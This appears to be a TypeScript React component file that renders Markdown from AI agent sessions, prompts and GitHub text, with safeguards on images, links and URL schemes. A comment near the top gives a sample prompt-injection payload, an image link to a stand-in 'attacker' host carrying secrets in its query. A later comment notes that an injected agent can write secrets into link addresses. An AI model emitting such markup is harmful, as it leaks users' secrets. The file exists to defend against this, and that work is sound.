import type { Element, ElementContent } from "hast";
import { type ComponentProps, Fragment, memo, useEffect, useMemo, useRef, useState } from "react";
import ReactMarkdown, { type Components, defaultUrlTransform, type ExtraProps, type Options, type UrlTransform } from "react-markdown";
import remarkGfm from "remark-gfm";
import { cn } from "@/lib/utils";
import { CodeBlock, CodeBlockActions, CodeBlockContent, CodeBlockCopyButton, CodeBlockHeader, CodeBlockLine, CodeBlockTitle } from "@/components/ui/code-block";
import { mediaSrc } from "../api";
import { highlightLines, useGrammars } from "../code-highlight";
import { loadedOnce, useLoaded } from "../loaded-once";
import { githubMediaPath, pullRequestOfUrl, type PullRequestDetail } from "../../src/shared/github";
import { hashForSession } from "../../src/shared/sessions";
import { linkedFile, remarkFilePaths } from "../file-paths";
import { remarkPromptChips } from "../prompt-tokens";
import { useRead } from "../reads";
import { parseBeforeAfter } from "../before-after";
import { parseReviewPages } from "../review-pages";
import { hashForPullRequests } from "../routing";
import { FileLink } from "./file-link";
import { LocalMedia, MediaStrip } from "./local-media";
import { Openable, OpenMarkdownImage, useMarkdownImages } from "./markdown-images";
import { BrandMark, SLACK_LOGO } from "./integrations/brand-logos";
import { OrgIcon } from "./org-icon";
import { type ChipProps, isChipKind, PromptChip } from "./prompt-chip";
import { isVisualLanguage, SessionVisual } from "./session-visual";

/** Where text written on GitHub may load images from directly; its uploads load through `githubMediaPath`. The page's CSP allows the same host. */
const GITHUB_AVATARS = "https://avatars.githubusercontent.com/";

const INLINE_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|avif);base64,/i;

const inlineImage = (src: string): boolean => INLINE_IMAGE.test(src);
const githubImage = (src: string): boolean => inlineImage(src) || src.startsWith(GITHUB_AVATARS);

/**
 * An image that loads only from where `allowed` says. Any other would be fetched the moment the text renders, so a
 * prompt-injected `![](https://attacker/?q=<secrets>)` would leak; it shows as a link to the image instead. With
 * `local`, as in agent text, a path to an image or video on this computer shows it through `GET /api/media`.
 */
const imageFrom =
	(allowed: (src: string) => boolean, local = false) =>
	({ node: _node, ...props }: ComponentProps<"img"> & { node?: unknown }) => {
		const { src, alt } = props;
		if (typeof src !== "string" || src === "") return <>{alt}</>;
		if (allowed(src))
			return local ? (
				<Openable src={src} alt={alt}>
					<img {...props} src={mediaSrc(src)} />
				</Openable>
			) : (
				<img {...props} src={mediaSrc(src)} />
			);
		const file = local ? linkedFile(src) : null;
		if (file && file.kind !== "text") return <LocalMedia path={file.path} alt={alt ?? ""} />;
		return (
			<a href={src} target="_blank" rel="noopener noreferrer">
				{alt || src}
			</a>
		);
	};

/** An image uploaded to GitHub, which its hosts serve only to a signed-in user; one that fails to load shows as a link to it. */
function GitHubUpload({ url, path, alt, ...props }: ComponentProps<"img"> & { url: string; path: string }) {
	const [failed, setFailed] = useState(false);
	return failed ? (
		<a href={url} target="_blank" rel="noopener noreferrer">
			{alt || url}
		</a>
	) : (
		<Openable src={path} alt={alt}>
			<img {...props} src={mediaSrc(path)} alt={alt ?? ""} loading="lazy" onError={() => setFailed(true)} className={cn("max-w-full rounded-lg", props.className)} />
		</Openable>
	);
}

const GitHubImage = imageFrom(githubImage);

/** Text written on GitHub: its uploads load through this server, any other image as `githubImage` allows; either opens large in a provided viewer. */
const githubImg: Components["img"] = ({ node: _node, ...props }) => {
	const { src, alt } = props;
	if (typeof src === "string") {
		const path = githubMediaPath(src);
		if (path) return <GitHubUpload {...props} url={src} path={path} />;
		if (githubImage(src))
			return (
				<Openable src={src} alt={alt}>
					<GitHubImage {...props} />
				</Openable>
			);
	}
	return <GitHubImage {...props} />;
};

/** The `figure` that `remarkFilePaths` ends agent text with: the images and videos it names. Markdown makes no other figure. */
const mediaFigure: Components["figure"] = ({ node }) => {
	const media = node?.properties.dataMedia;
	const paths: unknown = typeof media === "string" ? JSON.parse(media) : null;
	return Array.isArray(paths) ? <MediaStrip paths={paths.filter((path): path is string => typeof path === "string")} /> : null;
};

function ExternalLink({ href, children, ...props }: ComponentProps<"a">) {
	let service: "github" | "slack" | null = null;
	let label = "";
	let web = false;
	let titleUrl: string | null = null;
	const bare = children === href || children === href?.replace(/^https?:\/\//, "");
	try {
		const url = new URL(href ?? "");
		if (url.protocol === "https:" || url.protocol === "http:") {
			const host = url.hostname;
			web = true;
			if (host === "github.com" || host === "www.github.com") {
				service = "github";
				const pr = url.pathname.match(/^\/([^/]+)\/([^/]+)\/(?:pull|issues)\/(\d+)/);
				label = pr ? `${pr[1]}/${pr[2]} #${pr[3]}` : url.pathname.split("/").filter(Boolean).slice(0, 2).join("/") || "GitHub";
				const pull = url.pathname.match(/^\/([^/]+)\/([^/]+)\/pull\/(\d+)(?:\/|$)/);
				if (pull) titleUrl = `/api/pull-request/title?${new URLSearchParams({ owner: pull[1]!, repo: pull[2]!, number: pull[3]! })}`;
			} else if (host === "slack.com" || host.endsWith(".slack.com")) {
				service = "slack";
				label = url.pathname.includes("/archives/") ? "Slack message" : "Slack";
			}
		}
	} catch {
		// Relative and filtered URLs keep their original label.
	}
	const title = useRead<Pick<PullRequestDetail, "title">>(bare && !props.title ? titleUrl : null);
	return (
		<a {...props} href={href} target="_blank" rel="noopener noreferrer">
			{web ? (
				<>
					{service === "slack" ? (
						<BrandMark logo={SLACK_LOGO} className="mr-1 inline-flex size-3 align-middle" />
					) : service ? (
						<OrgIcon org={service} className="mr-1 inline-block align-middle" />
					) : null}
					<span className="font-semibold underline">{service && bare ? props.title || title.data?.title || label : children}</span>
				</>
			) : children}
		</a>
	);
}

const link: Components["a"] = ({ node: _node, ...props }) => <ExternalLink {...props} />;

/** A video, from its `src` or its first `<source>`, that plays only one uploaded to GitHub; any other shows as a link to it. */
const video: Components["video"] = ({ node, src: own }) => {
	const source = node?.children.find((child): child is Element => child.type === "element" && child.tagName === "source");
	const src = own ?? source?.properties.src;
	if (typeof src !== "string" || src === "") return null;
	const playable = githubMediaPath(src);
	if (!playable) {
		return (
			<a href={src} target="_blank" rel="noopener noreferrer">
				{src}
			</a>
		);
	}
	return (
		<video controls preload="metadata" src={mediaSrc(playable)} className="max-h-[70vh] w-full rounded-md bg-black">
			<a href={src} target="_blank" rel="noopener noreferrer">
				Download the video
			</a>
		</video>
	);
};

/** A link in agent text: a file's path opens in the file dialog, anything else in a new tab. */
const agentLink: Components["a"] = ({ href, children, node: _node, ...props }) => {
	const file = href === undefined ? null : linkedFile(href);
	return file === null ? (
		<ExternalLink {...props} href={href}>{children}</ExternalLink>
	) : (
		<FileLink path={file.path}>{children}</FileLink>
	);
};

/** Where a chip opens in the dashboard; `null` for a skill, command, file, folder, person, or Browser annotation, which have no page of their own. */
function chipHref({ kind, target }: ChipProps): string | null {
	switch (kind) {
		case "session":
			return hashForSession(target);
		case "pull-request": {
			const pr = pullRequestOfUrl(target);
			return pr ? hashForPullRequests(pr) : null;
		}
		case "skill":
		case "command":
		case "file":
		case "directory":
		case "person":
		case "annotation":
			return null;
		default: {
			const unhandled: never = kind;
			return unhandled;
		}
	}
}

/**
 * A reference in a sent prompt, which `remarkPromptChips` marks; a session or pull request opens in the
 * dashboard. Any other `span` stays one.
 */
function PromptChipSpan({ node, ...props }: ComponentProps<"span"> & ExtraProps) {
	const { dataChip: kind, dataLabel: label, dataTarget: target } = node?.properties ?? {};
	if (!isChipKind(kind) || typeof label !== "string" || typeof target !== "string") return <span {...props} />;
	const chip = { kind, label, target };
	const href = chipHref(chip);
	return href === null ? (
		<PromptChip {...chip} />
	) : (
		<a href={href} className="no-underline">
			<PromptChip {...chip} />
		</a>
	);
}

const textOf = (node: Element | ElementContent): string =>
	node.type === "text" ? node.value : node.type === "element" ? node.children.map(textOf).join("") : "";

/** A `<pre>`'s fence language, from its `<code>`'s `language-*` class, and its text. A `<pre>` in GitHub's raw HTML has no `<code>` and no language. */
export function fenceOf(node: Element | undefined): { language: string | null; text: string } {
	const code = node?.children.find((child): child is Element => child.type === "element" && child.tagName === "code");
	const className = code?.properties.className;
	const language = (Array.isArray(className) ? className : []).map(String).find(name => name.startsWith("language-"))?.slice("language-".length) ?? null;
	return { language, text: node ? textOf(code ?? node).replace(/\n$/, "") : "" };
}

/** `text`'s lines, colored as `language` once the grammars load, for a `CodeBlockContent`. */
export function CodeLines({ text, language }: { text: string; language: string | null }) {
	useGrammars();
	return highlightLines(text, language ?? "").map((tokens, index) => (
		<CodeBlockLine key={index}>
			{tokens.map((token, at) => (token.className ? <span key={at} className={token.className}>{token.text}</span> : token.text))}
		</CodeBlockLine>
	));
}

/** A code block, colored by its fence's language, which titles it, with a copy button. */
export function FencedCode({ language, text }: { language: string | null; text: string }) {
	const copy = <CodeBlockCopyButton value={text} />;
	return (
		<CodeBlock>
			{language ? (
				<CodeBlockHeader>
					<CodeBlockTitle>{language}</CodeBlockTitle>
					<CodeBlockActions>{copy}</CodeBlockActions>
				</CodeBlockHeader>
			) : (
				<CodeBlockActions>{copy}</CodeBlockActions>
			)}
			<CodeBlockContent>
				<CodeLines text={text} language={language} />
			</CodeBlockContent>
		</CodeBlock>
	);
}

const codeBlock: Components["pre"] = ({ node }) => <FencedCode {...fenceOf(node)} />;

/**
 * In a session's message, a `mermaid` or `chart` fence draws as a diagram or a chart, and a valid `review-pages` or
 * `before-after` list draws nothing, since the **Review visuals** button and the **Review** tab open it; any other is a code block.
 */
const HIDDEN_LISTS = new Map<string, (source: string) => unknown[] | null>([
	["review-pages", parseReviewPages],
	["before-after", parseBeforeAfter],
]);

const sessionCodeBlock: Components["pre"] = ({ node }) => {
	const { language, text } = fenceOf(node);
	if (language !== null && HIDDEN_LISTS.get(language)?.(text)) return null;
	if (!isVisualLanguage(language)) return <FencedCode language={language} text={text} />;
	return <SessionVisual language={language} source={text} code={<CodeLines text={text} language={language} />} />;
};

const AGENT_COMPONENTS: Components = { a: agentLink, img: imageFrom(inlineImage, true), figure: mediaFigure, pre: codeBlock };
const PROMPT_COMPONENTS: Components = { ...AGENT_COMPONENTS, span: PromptChipSpan };
const SESSION_AGENT_COMPONENTS: Components = { ...AGENT_COMPONENTS, pre: sessionCodeBlock };
const SESSION_PROMPT_COMPONENTS: Components = { ...PROMPT_COMPONENTS, pre: sessionCodeBlock };
const GITHUB_COMPONENTS: Components = { a: link, img: githubImg, video, pre: codeBlock };

/** react-markdown drops `data:` URLs; the images the page allows inline are the exception. */
const urlTransform = (url: string, key: string): string => (key === "src" && inlineImage(url) ? url : defaultUrlTransform(url));

/**
 * In agent text a `file://` link also keeps its path, which the file dialog opens. One whose escapes do not decode drops
 * as any other unsafe scheme does, since agent text must not throw while the page renders.
 */
const agentUrlTransform = (url: string, key: string): string => {
	if (key !== "href" || !url.startsWith("file:///")) return urlTransform(url, key);
	try {
		return decodeURI(url.slice("file://".length));
	} catch {
		return defaultUrlTransform(url);
	}
};

type Plugins = NonNullable<Options["rehypePlugins"]>;

/** The plugins, components, and URL filter that one kind of text renders with. */
export interface MarkdownPreset {
	remark: NonNullable<Options["remarkPlugins"]>;
	/** Whether the text's raw HTML renders, sanitized to GitHub's schema, through `RAW_HTML`, which runs before `rehype`. */
	rawHtml: boolean;
	rehype: Plugins;
	components: Components;
	urlTransform: UrlTransform;
	/** Whether a click on one of the text's images opens it large, with ←/→ to the text's other images. */
	openImages: boolean;
	/** Whether the link preview card may have the server read a link's page and icon; agent text may not, since a prompt-injected agent can write a secret into an address. */
	linkPages: boolean;
	/**
	 * Whether the text renders in the blocks {@link markdownBlocks} cuts it into, so a streamed token parses only the last
	 * one again. Text whose raw HTML renders, or whose references read where they sit in the whole text, renders whole.
	 */
	blocks: boolean;
}

/** `RAW_HTML`, or, should its chunk fail to load, no plugins, which leaves the raw HTML as escaped text. */
const rawHtmlPlugins = loadedOnce<Plugins>(() => import("./raw-html").then(({ RAW_HTML }) => RAW_HTML), []);

export const loadRawHtml = (): Promise<unknown> => rawHtmlPlugins.load();

/**
 * Agent text: the path of a file opens it in the file dialog, a relative one against `FileBaseContext`; an image or
 * video on this computer shows in place when the text writes it as an image, and under the text when it only names it.
 */
export const AGENT_PRESET: MarkdownPreset = { remark: [remarkGfm, remarkFilePaths], rawHtml: false, rehype: [], components: AGENT_COMPONENTS, urlTransform: agentUrlTransform, openImages: true, linkPages: false, blocks: true };

/** A user's prompt, read as agent text with its skill, command, file, pull request, and session references as chips; a reference at the very start reads apart from one later, so it renders whole. */
export const PROMPT_PRESET: MarkdownPreset = { ...AGENT_PRESET, remark: [remarkGfm, remarkPromptChips, remarkFilePaths], components: PROMPT_COMPONENTS, blocks: false };

/** A settled message in a session's conversation: agent text whose `mermaid` and `chart` fences draw as visuals. */
export const SESSION_AGENT_PRESET: MarkdownPreset = { ...AGENT_PRESET, components: SESSION_AGENT_COMPONENTS };

/** A user's prompt in a session's conversation, whose `mermaid` and `chart` fences draw as visuals. */
export const SESSION_PROMPT_PRESET: MarkdownPreset = { ...PROMPT_PRESET, components: SESSION_PROMPT_COMPONENTS };

interface BreakNode {
	type: string;
	value?: string;
	children?: BreakNode[];
}

/** Turns each line break inside a paragraph's text into a hard break, so lines written one under the other, such as a poem's, stay so. */
const remarkLineBreaks = () => (root: BreakNode) => {
	const visit = (node: BreakNode): void => {
		if (!node.children) return;
		node.children = node.children.flatMap(child => {
			if (child.type !== "text" || !child.value?.includes("\n")) return [child];
			return child.value.split(/\r?\n/).flatMap((line, i) => (i === 0 ? [{ type: "text", value: line }] : [{ type: "break" }, { type: "text", value: line }]));
		});
		for (const child of node.children) visit(child);
	};
	visit(root);
};

/** A message one Bot sent another, shown in the receiving Bot's conversation: agent text whose line breaks stay. */
export const BOT_MESSAGE_PRESET: MarkdownPreset = { ...SESSION_AGENT_PRESET, remark: [...AGENT_PRESET.remark, remarkLineBreaks] };

/**
 * Text written on GitHub, whose raw HTML renders as GitHub renders it, through rehype-sanitize's schema, which follows
 * GitHub's; HTML comments drop out, as GitHub hides them. Images load from GitHub's hosts.
 */
export const GITHUB_PRESET: MarkdownPreset = { remark: [remarkGfm], rawHtml: true, rehype: [], components: GITHUB_COMPONENTS, urlTransform, openImages: false, linkPages: true, blocks: false };

/** A fence's opening or closing line: its indent, its run of backticks or tildes, and the rest. */
const FENCE = /^( {0,3})(`{3,}|~{3,})(.*)$/;
const BLANK = /^[ \t]*\r?$/;
/** A line that, after a blank line, may still belong to the block above: an indented one, or a list item, which may make the list above loose. */
const CONTINUES = /^(?:[ \t]|(?:[-+*]|\d{1,9}[.)])(?:[ \t]|\r?$))/;
/** A line that may start an HTML block that runs across blank lines, CommonMark's kinds 1 to 5, after any container markers. */
const LONG_HTML = /^[ \t>*+\-\d.)]*<(?:(?:pre|script|style|textarea)(?:[\s>]|$)|!--|\?|![A-Za-z]|!\[CDATA\[)/i;

/**
 * `text` cut at blank lines outside fences into blocks that render as the whole text does, each block keeping the blank
 * lines after it, so the blocks join back into `text`. It cuts only where the next line starts a block of its own: not an
 * indented line or a list item, and not inside a fence. Text with a link or footnote definition, which any block may
 * read, or an HTML block that may span blank lines, stays whole; past a fence it cannot tell the end of, the rest stays one block.
 */
export function markdownBlocks(text: string): string[] {
	const starts: number[] = [];
	let fence: { char: string; length: number; indent: number } | null = null;
	let cutting = true;
	let content = false;
	let blank = false;
	let offset = 0;
	for (const line of text.split("\n")) {
		const at = offset;
		offset += line.length + 1;
		if (fence !== null) {
			const close = FENCE.exec(line);
			if (close && close[2]![0] === fence.char && close[2]!.length >= fence.length && BLANK.test(close[3]!)) {
				fence = null;
				blank = false;
				continue;
			}
			if (BLANK.test(line) || line.length - line.replace(/^[ \t]+/, "").length >= fence.indent) continue;
			// A line indented less than its fence ends the fence only when a list item held it, which the cut does not track.
			fence = null;
			cutting = false;
		}
		if (line.includes("]:") || LONG_HTML.test(line)) return [text];
		if (BLANK.test(line)) {
			blank = true;
			continue;
		}
		if (cutting && blank && content && !CONTINUES.test(line)) starts.push(at);
		blank = false;
		content = true;
		const open = cutting ? FENCE.exec(line) : null;
		if (open && !(open[2]![0] === "`" && open[3]!.includes("`"))) fence = { char: open[2]![0]!, length: open[2]!.length, indent: open[1]!.length };
	}
	return [0, ...starts].map((start, index) => text.slice(start, starts[index] ?? text.length));
}

/** What one block shows of the media strip `remarkFilePaths` ends it with: the images and videos it names, and the images it shows in place. */
interface BlockMedia {
	named: string[];
	shown: string[];
}

interface MediaNode {
	type: string;
	url?: string;
	children?: MediaNode[];
	data?: { hName?: string; hProperties?: Record<string, unknown> };
}

const imagesIn = (node: MediaNode): string[] => [...(node.type === "image" && node.url ? [node.url] : []), ...(node.children ?? []).flatMap(imagesIn)];

/**
 * Runs after `remarkFilePaths` on one block: takes the block's media strip off and records it, with the images the block
 * shows, in `media` by the block's text. On the last block, `before` lists the blocks above it, and the strip of the
 * whole text goes back at its end: the media every block names, in order and each once, but for those any block shows.
 */
const remarkBlockMedia =
	({ media, before }: { media: Map<string, BlockMedia>; before: readonly string[] | null }) =>
	(root: MediaNode, file: { value: unknown }) => {
		const children = root.children ?? [];
		const strip = children.at(-1)?.type === "mediaStrip" ? children.pop() : undefined;
		const listed = strip?.data?.hProperties?.dataMedia;
		const own: BlockMedia = { named: typeof listed === "string" ? (JSON.parse(listed) as string[]) : [], shown: imagesIn(root) };
		media.set(String(file.value), own);
		if (before === null) return;
		const blocks = [...before.map(text => media.get(text)), own];
		const shown = new Set(blocks.flatMap(block => block?.shown ?? []));
		const named = [...new Set(blocks.flatMap(block => block?.named ?? []))].filter(path => !shown.has(path));
		if (named.length > 0) children.push({ type: "mediaStrip", children: [], data: { hName: "figure", hProperties: { dataMedia: JSON.stringify(named) } } });
	};

type Remark = MarkdownPreset["remark"];

/** One block of a message, rendering again only when its text or its plugins change, so a settled block skips a streamed token. */
const MarkdownBlock = memo(function MarkdownBlock({ text, remark, rehype, components, urlTransform }: { text: string; remark: Remark; rehype: Plugins; components: Components; urlTransform: UrlTransform }) {
	return (
		<ReactMarkdown remarkPlugins={remark} rehypePlugins={rehype} components={components} urlTransform={urlTransform}>
			{text}
		</ReactMarkdown>
	);
});

/**
 * Markdown text is untrusted. react-markdown escapes raw HTML and filters unsafe link schemes, and images load only
 * inline (`data:`) or from where the preset allows.
 *
 * Parsing and highlighting a long reply is the page's costliest render, so the same text never renders twice, and with
 * the preset's `blocks` a streamed token parses only the last block again: each settled block keeps its render.
 * Blocks are joined by the line break the whole text's parse puts between top-level elements, so the markup is the same.
 * Text whose raw HTML renders shows nothing until its plugins load, rather than its HTML as escaped text.
 */
export const MessageMarkdown = memo(function MessageMarkdown({ text, preset = AGENT_PRESET }: { text: string; preset?: MarkdownPreset }) {
	const rawHtml = useLoaded(rawHtmlPlugins, preset.rawHtml);
	const root = useRef<HTMLDivElement>(null);
	const images = useMarkdownImages(root);
	const rehype = useMemo(() => (rawHtml && preset.rawHtml ? [...rawHtml, ...preset.rehype] : preset.rehype), [rawHtml, preset.rawHtml, preset.rehype]);
	const blocks = preset.blocks ? markdownBlocks(text) : [text];
	const strips = preset.blocks && preset.remark.includes(remarkFilePaths);
	const media = useRef(new Map<string, BlockMedia>()).current;
	const settled = useMemo<Remark>(() => (strips ? [...preset.remark, [remarkBlockMedia, { media, before: null }]] : preset.remark), [strips, preset.remark, media]);
	const last: Remark = strips ? [...preset.remark, [remarkBlockMedia, { media, before: blocks.slice(0, -1) }]] : preset.remark;
	useEffect(() => {
		const kept = new Set(blocks);
		for (const key of media.keys()) if (!kept.has(key)) media.delete(key);
	});
	if (preset.rawHtml && !rawHtml) return null;
	const body = (
		<div ref={root} data-link-preview={preset.linkPages ? undefined : "address"} className="message-markdown max-w-full whitespace-normal break-words">
			{blocks.map((block, index) => (
				<Fragment key={index}>
					{index > 0 && "\n"}
					<MarkdownBlock text={block} remark={index === blocks.length - 1 ? last : settled} rehype={rehype} components={preset.components} urlTransform={preset.urlTransform} />
				</Fragment>
			))}
		</div>
	);
	if (!preset.openImages) return body;
	return (
		<OpenMarkdownImage.Provider value={images.open}>
			{body}
			{images.viewer}
		</OpenMarkdownImage.Provider>
	);
});
